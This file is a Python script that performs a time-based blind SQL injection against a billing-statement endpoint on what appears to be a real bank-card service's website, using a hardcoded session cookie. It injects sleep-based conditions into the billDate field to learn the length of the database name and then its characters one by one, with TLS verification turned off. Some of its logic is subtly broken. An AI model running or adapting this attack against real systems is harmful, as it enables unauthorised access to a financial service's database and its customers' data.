#!/usr/local/Cellar/python/3.7.1/bin
# -*- coding: UTF-8 -*-
import requests, re, time
import string
url ="https://web.cupdata.com/cloudstmt/loginController/loadMyBillForChangeBillYM.htm"
daname=""
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
    "Cookie":"JSESSIONID=AE516AF79CC005222FEEAE5ECB22EFEE; cookie-persist-47873=ABAOLNAKJABP; insert-always=!OANX6/Lpig7XCPin28AKqPbQOa2Te0edOWyWVTrzxpbBr2b34cB46Sp3PwXescpw+qFVDv2hPeFByA==",
    "Referer":"https://web.cupdata.com/cloudstmt/myBillController/showIndex.htm?version=1.0",
    "X-Requested-With":"XMLHttpRequest",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
    "Origin":"https://web.cupdata.com"

}
def timeout(payload):
    try:
        requests.packages.urllib3.disable_warnings()
        res = requests.post(url=url,data=payload,headers=header,timeout=3,verify=False)
        return res.text()
    except Exception as e:
        return "Error"
dbnamelen = 1
while True:
    dbnamelen+=1
    payload="billDate=202009'and if(length(database())="+str(dbnamelen)+",sleep(5),1) and'1'='1"
    start_time = time.time()
    requests.packages.urllib3.disable_warnings()
    try:
        requests.packages.urllib3.disable_warnings()
        requests.post(url=url, data=payload, headers=header, timeout=3, verify=False)
    except Exception as e:
        print("")
        end_time = time.time()
        use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
        if use_time >3:
            print("...... data's length is :" + str(dbnamelen))
            break
        if(dbnamelen>=30):
            print("Error")


for i in range(1,dbnamelen+1):
    for char in string.ascii_lowercase:
        payload2={"billDate":"202009'and if(substr(database(),"+str(i)+",1)='"+char+"',sleep(5),1) and'1'='1"}
        start_time = time.time()
        requests.packages.urllib3.disable_warnings()
        try:
            requests.packages.urllib3.disable_warnings()
            requests.post(url=url, data=payload2, headers=header, timeout=3, verify=False)
        except Exception as e:
            print("")
        end_time = time.time()
        use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
        if use_time > 3:
            daname+=char
print("...... data's length is :" + str(daname))
